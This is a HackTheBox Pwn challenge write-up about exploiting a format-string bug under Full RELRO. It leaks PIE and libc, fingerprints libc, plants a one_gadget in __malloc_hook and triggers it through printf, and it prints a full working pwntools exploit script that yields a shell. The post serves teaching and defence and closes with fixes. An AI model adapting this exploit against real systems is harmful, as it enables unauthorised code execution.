---
title: "What does the f say?"
date: 2027-12-18 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, binary-exploitation, format-string, full-relro, malloc-hook, one-gadget, pwntools, cwe-134]
description: "A medium Pwn challenge: a space-bar menu that prints your order with printf(buf) and no format string of its own. Full RELRO kills the classic GOT overwrite, so you leak libc through a readable GOT slot, fingerprint the exact libc patch build, and plant a one_gadget in __malloc_hook — then a %100000c field width forces printf's own malloc to fire it."
---

## Overview

`What does the f say?` is a medium HackTheBox **Pwn** challenge — a 64-bit "Fox space bar" menu
app with every protection on (Full RELRO, stack canary, NX, PIE). Ordering the "Kryptonite vodka"
reads your input and hands it straight to `printf`, a textbook [format string](https://cwe.mitre.org/data/definitions/134.html)
bug. Because Full RELRO makes the GOT read-only, the usual `%n`→GOT overwrite is dead — so the path
is: leak libc by *reading* a GOT slot, identify the exact libc build, overwrite the writable
`__malloc_hook` with a one_gadget, and trigger it from inside `printf` itself.

## The technique

The vulnerable function does, in effect:

```c
read(0, buf, 0x1d);
printf(buf);          // attacker controls the format string
```

and it sits inside the bar's menu loop, so the format-string primitive is **repeatable** on one
connection. With Full RELRO the GOT is read-only (no arbitrary `%n` into it) but still **readable**,
which is exactly how you leak libc without a single write. From there:

1. **Leak PIE** — `%19$p` is a saved return into `main` (`pie_base + 0x1841`), so subtracting the
   image offset gives the binary base and lets you point at the GOT.
2. **Leak libc** — place a GOT slot's address in the buffer and read it with `%9$s`. A quirk worth
   remembering: `printf@GOT` misbehaved (it printed the GOT pointer itself, not the deref), while
   `read@GOT`/`puts@GOT` dereference cleanly. Leak off `read`.
3. **Fingerprint the exact libc** — the leaked `read`/`puts` last-three-nibbles fed to
   [libc.rip](https://libc.rip) pin the build to `libc6_2.27-3ubuntu1.2` (not the base
   `2.27-3ubuntu1`, whose `__malloc_hook`/one_gadget offsets differ). Using the wrong patch build
   yields a non-page-aligned base and a dud gadget.
4. **Overwrite `__malloc_hook`** — six single-byte format writes plant a one_gadget
   (`libc + 0x4f3c2`, the `[rsp+0x40] == NULL` variant) into `__malloc_hook` (`libc + 0x3ebc30`),
   which is a *writable* libc pointer even under Full RELRO.
5. **Fire it** — `printf("%100000c")` makes glibc `malloc()` a large work buffer for the field
   padding; `malloc` sees the non-NULL hook and calls it → `execve("/bin/sh")`.

## Solution

Two details make or break the exploit and cost the most time if missed:

- **Delivery.** `stdin` is unbuffered and `scanf("%d")` peek-consumes the trailing newline. If you
  send the menu digit and the payload as one write, the remote fragments TCP and the `read()` grabs
  a partial or newline-shifted buffer — every argument offset is then wrong. The fix is a **barrier**:
  send `2\n`, wait for the "Kryptonite?" prompt (so `read()` is already blocking), then send the
  format payload by itself.
- **Fully positional writes.** Use `%1$Nc%10$hhn`, never a mixed non-positional `%Nc` with a
  positional `%10$hhn` — glibc mis-indexes the argument list and scribbles on a garbage address
  (instant SIGSEGV).

The full working exploit:

```python
#!/usr/bin/env python3
import sys
from pwn import *

context.arch = 'amd64'

libc = ELF('./libc272.so', checksec=False)        # libc6_2.27-3ubuntu1.2
READ_OFF   = libc.sym['read']
MHOOK_OFF  = libc.sym['__malloc_hook']            # 0x3ebc30
ONE_GADGET = 0x4f3c2                              # execve("/bin/sh"), [rsp+0x40]==NULL
READ_GOT     = 0x3fb0                             # elf-relative
MAIN_RET_OFF = 0x1841                             # %19$p == pie_base + 0x1841

io = remote(sys.argv[1], int(sys.argv[2]))

def fmt(payload):
    io.recvuntil(b'2. Space food')
    io.sendline(b'1')                    # Space drinks
    io.recvuntil(b'rocks)')              # drinks menu
    io.send(b'2\n')                      # Kryptonite vodka; scanf eats "2"+newline
    io.recvuntil(b'Kryptonite?\n')       # barrier: program is now blocking on read()
    io.send(payload + b'\n')             # read() grabs exactly this
    return io.recvuntil(b'1. Space drinks', drop=True)

# 1) leak PIE
pie = int(fmt(b'%19$p').split(b'\n')[0], 16) - MAIN_RET_OFF
assert pie & 0xfff == 0

# 2) leak libc via read@GOT (%s dereferences the placed pointer; printf@GOT is anomalous)
leak = 0
for _ in range(6):
    line = fmt(b'%9$s'.ljust(8, b'.') + p64(pie + READ_GOT)).split(b'\n')[0]
    v = u64(line[:6].ljust(8, b'\x00'))
    if 0x7f0000000000 <= v < 0x800000000000:
        leak = v
        break
libc.address = leak - READ_OFF
assert libc.address & 0xfff == 0

target = libc.address + MHOOK_OFF
value  = libc.address + ONE_GADGET

# 3) byte-write one_gadget into __malloc_hook (fully positional, address at offset 10)
for i in range(6):
    b = (value >> (8 * i)) & 0xff
    w = b if b != 0 else 256
    core = ('%%1$%dc%%10$hhn' % w).encode()
    fmt(core.ljust(16, b'.') + p64(target + i))

# 4) trigger: huge field width -> printf's internal malloc -> hook -> shell
io.recvuntil(b'2. Space food'); io.sendline(b'1')
io.recvuntil(b'rocks)'); io.send(b'2\n')
io.recvuntil(b'Kryptonite?\n'); io.send(b'%100000c\n')

io.sendline(b'cat /home/ctf/flag.txt')
io.interactive()
```

Running it against a fresh instance drops a shell as the `ctf` user and reads the flag:

```bash
cat /home/ctf/flag.txt   # HTB{...}
```

## Why it worked

The developer passed untrusted input as the *format string* rather than as a `%s` argument, giving
an attacker a read/write primitive over the process. Full RELRO, PIE, canary and NX raise the bar —
they kill the naive `%n`→GOT overwrite and force a libc leak first — but none of them stop a format
string from reading a GOT slot to defeat ASLR, then pivoting to a still-writable libc function
pointer. `__malloc_hook` was the perfect target: writable, and reachable from `printf`'s own internal
`malloc` the moment you ask for a huge field width.

## Fix / defense

Never let user input reach the format-string parameter: `printf("%s", buf)`. Compilers catch this
with `-Wformat -Wformat-security` / `-Werror=format-security`. And note that the whole `__malloc_hook`
technique is why glibc ≥ 2.34 removed `__malloc_hook`/`__free_hook` — on a modern libc this same bug
would have to pivot to FSOP (`_IO_2_1_stdout_`) or a stack-return ROP chain built through the format
write instead.
